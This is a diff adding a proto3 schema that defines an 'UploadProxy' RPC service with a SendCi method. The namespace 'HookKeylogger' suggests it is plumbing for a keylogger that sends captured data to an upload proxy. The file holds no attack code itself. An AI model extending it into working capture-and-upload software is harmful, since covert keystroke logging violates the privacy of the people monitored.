@@ -1,0 +1,23 @@
+﻿syntax = "proto3";
+
+package rpc;
+
+option csharp_namespace = "HookKeylogger.UploadProxy.Rpc";
+import "Server/messages.proto";
+
+message SendRequest{
+	types.CI ci = 1;
+}
+
+message SendResponse{
+	enum Status {
+		OK = 0;
+		ERROR = 1;
+	}
+	Status status = 1;
+}
+
+service UploadProxy {
+	//Interactions between the proxy client library and the running proxy process
+	rpc SendCi(SendRequest) returns (SendResponse) {}
+}
